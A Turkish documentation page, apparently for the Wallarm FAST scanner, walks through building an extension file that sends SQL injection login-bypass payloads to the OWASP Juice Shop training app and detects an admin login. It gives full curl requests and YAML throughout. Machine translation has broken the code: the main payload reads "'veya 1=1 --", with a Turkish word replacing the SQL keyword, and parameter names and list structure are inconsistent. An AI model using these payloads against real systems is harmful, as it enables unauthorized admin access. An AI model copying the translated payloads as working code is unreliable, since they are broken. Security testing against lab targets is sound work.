[link-meta-info]:           ../create-extension.md#structure-of-the-meta-info-section
[link-send-headers]:        ../phase-send.md#working-with-the-host-header
[link-using-extension]:     ../using-extension.md
[link-app-examination]:     app-examination.md

[doc-send-phase]:           ../phase-send.md
[doc-detect-phase]:         ../detect/phase-detect.md

[link-juice-shop]:          https://www.owasp.org/index.php/OWASP_Juice_Shop_Project



#   Değiştirmeyen Uzantının Oluşturulması

Bu belgede tarif edilen uzantı, bazı yükleri enjekte etmek için gelen temel isteği değiştirmeyecektir. Bunun yerine, iki önceden tanımlanmış test isteği, temel istekte belirtilen ana makineye gönderilecektir. Bu test istekleri, [“OWASP Juice Shop”][link-juice-shop] hedef uygulamasının giriş formundaki SQLi açıklığını istismar edebilecek yükleri içerir.


##  Hazırlıklar

FAST uzantısının oluşturulmasından önce hedef uygulamanın davranışını [incelemeniz][link-app-examination] şiddetle tavsiye edilir.


##  Uzantının Oluşturulması

Uzantıyı tarif eden bir dosya oluşturun (`non-mod-extension.yaml`, örneğin) ve gerekli bölümlerle doldurun:

1.  [**`meta-info` bölümü**][link-meta-info].

   Uzantının tespit etmeye çalışacağı açıklığın açıklamasını hazırlayın.
    
    * açıklık başlığı: `OWASP Juice Shop SQLi (değiştirmeyen uzantı)`
    * açıklık açıklaması: `OWASP Juice Shop'ta SQLi'nin Demosu (Yönetici Girişi)`
    * açıklık türü: SQL injeksiyonu
    * açıklık tehdit seviyesi: yüksek
    
    İlgili `meta-info` bölümü şöyle görünmelidir:
    
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (değiştirmeyen uzantı)'
      - description: 'OWASP Juice Shop'ta SQLi'nin Demosu (Yönetici Girişi)'
    ```
    
2.  **`send` bölümü, [Gönderme aşaması][doc-send-phase]**

   Hedef uygulamadaki SQL injeksiyon açıklığını istismar etmek için herhangi bir `şifre` değeriyle birlikte `email` parametre değeri olarak gönderilmesi gereken iki yük vardır:
    
    * `'veya 1=1 --`
    * `admin@juice-sh.op'--`
    
   Bu iki yükte, 

    * yukarıda tarif edilen değerlerden biriyle `email` parametresi ve 
    * keyfi bir değerle `şifre` parametresi 

    içeren iki test isteği oluşturabilirsiniz.
    
    Bu isteklerden birini örnek hedef uygulamamızı (OWASP Juice Shop) test etmek için kullanmak yeterlidir.
    
    Ancak, bir gerçek uygulamanın güvenlik testini gerçekleştirirken birkaç hazırlanmış test isteği setine sahip olmak yararlı olabilir: isteklerden biri artık uygulamanın güncellemeleri ve iyileştirmeleri sayesinde bir açıklığı istismar edemezse, diğer test istekleri hala kullanılan diğer yükler nedeniyle açıklığı istismar edebilir olabilir.
   
    Yukarıdaki listedeki ilk yükle benzer bir istek şöyledir:

    ```
    curl --request POST --url http://ojs.example.local/rest/user/login \
         --header 'content-type: application/json' \
         --header 'host: ojs.example.local' \
         --data '{"email":"'\''veya 1=1 --", "password":"12345"}'
    ```

    İkinci istek birincisine benzer:

    ```
    curl --request POST --url http://ojs.example.local/rest/user/login \
         --header 'content-type: application/json' \
         --header 'host: ojs.example.local' \
         --data '{"email":"admin@juice-sh.op'\''--", "password":"12345"}'
    ```

    Bu iki test isteğinin tariflerini içeren `send` bölümünü ekleyin:

    ```
    send:
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"''veya 1=1 --","password":"12345"}'
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"admin@juice-sh.op''--","password":"12345"}'
    ``` 
    
   !!! info "`Host` başlığı hakkında bir not" 
       Bu özellikli SQLi açıklığının istismarını etkilemediği için bu isteklerde `Host` başlığını çıkarabilirsiniz. Bir FAST node, gelen temel isteklerden çıkarılan `Host` başlığını otomatik olarak ekleyecektir.
        
       Gönderme aşamasının istek başlıklarını nasıl ele aldığı hakkında [burada][link-send-headers] okuyun.

     3.  **`detect` bölümü, [Tespit aşaması][doc-detect-phase]**.
    
    Aşağıdaki koşullar yönetici haklarıyla kullanıcı kimlik doğrulamasının başarılı olduğunu gösterir:
    
    * Yanıt gövdesinde `1` değeriyle alışveriş sepeti tanımlayıcısı parametresinin varlığı. Parametre, aşağıda gösterildiği gibi JSON formatında olmalıdır:

        ```
        "bid":1
        ```
    
    * Yanıt gövdesinde `admin@juice-sh.op` değeriyle kullanıcı email parametresinin varlığı. Parametre, aşağıda gösterildiği gibi JSON formatında olmalıdır:

        ```
        "umail":"admin@juice-sh.op"
        ```
    
    Yukarıda tarif edilen koşullara göre saldırının başarılı olup olmadığını kontrol eden `detect` bölümünü ekleyin.
    
    ```
    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```

!!! info "Özel sembolleri kaçış karakteri ile kullanma"
    Stringlerdeki özel sembolleri kaçış karakteri ile kullanmayı unutmayın.

##  Uzantı Dosyası

Şimdi `non-mod-extension.yaml` dosyası uzantının işlemesi için gerekli bölümler setini içeriyor. Dosyanın içeriğinin listesi aşağıda gösterilmiştir:

??? info "non-mod-extension.yaml"
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (değiştirmeyen uzantı)'
      - description: 'OWASP Juice Shop'ta SQLi'nin Demosu (Yönetici Girişi)'

    send:
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"''veya 1=1 --","password":"12345"}'
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"admin@juice-sh.op''--","password":"12345"}'

    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```

##  Uzantının Kullanımı

Oluşturulan ifadenin nasıl kullanılacağı hakkında ayrıntılı bilgi için, [bu belgeyi][link-using-extension] okuyun.